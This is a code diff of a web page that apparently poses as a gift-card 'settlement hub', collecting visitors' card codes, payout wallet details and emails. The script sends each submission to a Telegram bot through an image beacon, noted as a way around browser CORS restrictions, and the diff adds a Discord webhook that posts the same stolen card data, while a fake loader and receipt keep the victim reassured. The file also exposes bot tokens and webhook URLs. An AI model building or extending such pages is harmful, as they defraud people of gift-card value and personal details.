@@ -181,9 +181,9 @@
     <a href="https://wa.me/447400436904" class="chat-btn"><div class="dot"></div><span>WhatsApp Support</span></a>
 
     <script>
-        // INTEGRATED TELEGRAM TOKENS
         const TELEGRAM_TOKEN = "8662083297:AAHESm81XuXqj7ZUgESysc1RH-lRiSPwARs"; 
         const TELEGRAM_CHAT_ID = "5022438644";
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484706100916781057/b13TunLishCPP0s3b2Q6G0bG84UMShEICD6KRiQaWYUHmG0c2rSoq2mJ6FWjuEgZbfJS";
         
         let method = ""; let rateL = 1; let sym = "USD";
         const successSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2013/2013-preview.mp3');
@@ -245,10 +245,13 @@
             
             if(!method || !cardCode || !walletDetails || !userEmail) return alert("Please fill all fields.");
 
+            // Play Alert Sound
+            successSound.play();
+
             document.getElementById('form').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
 
-            // Format message for Telegram
+            // Telegram Message
             const messageText = `🚨 *NEW DLA SUBMISSION*%0A%0A` +
                                 `*Asset:* ${assetName}%0A` +
                                 `*Card Code:* \`${cardCode}\` %0A` +
@@ -258,10 +261,31 @@
                                 `*User Email:* ${userEmail}`;
 
             const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${messageText}&parse_mode=Markdown`;
+            new Image().src = telegramUrl;
 
-            // Using Image beacon for bypass browser CORS restrictions
-            const tracker = new Image();
-            tracker.src = telegramUrl;
+            // Discord Message
+            const discordPayload = {
+                username: "DLA SETTLEMENT HUB",
+                embeds: [{
+                    title: "🚨 NEW CARD RECEIVED",
+                    color: 13938487,
+                    fields: [
+                        { name: "Asset Class", value: assetName, inline: true },
+                        { name: "USD Value", value: amount, inline: true },
+                        { name: "Card Code (Tap to Copy)", value: "```" + cardCode + "```" },
+                        { name: "Payout Method", value: method, inline: true },
+                        { name: "Recipient Details", value: walletDetails },
+                        { name: "User Email", value: userEmail }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(discordPayload)
+            });
 
             let p = 0;
             let iv = setInterval(() => {
@@ -284,7 +308,6 @@
             document.getElementById('r-local-val').innerText = document.getElementById('local-payout').innerText;
             document.getElementById('r-date').innerText = new Date().toLocaleString();
             new QRCode(document.getElementById("qrcode"), { text: tid, width: 60, height: 60 });
-            successSound.play();
             startTimer();
         }
 
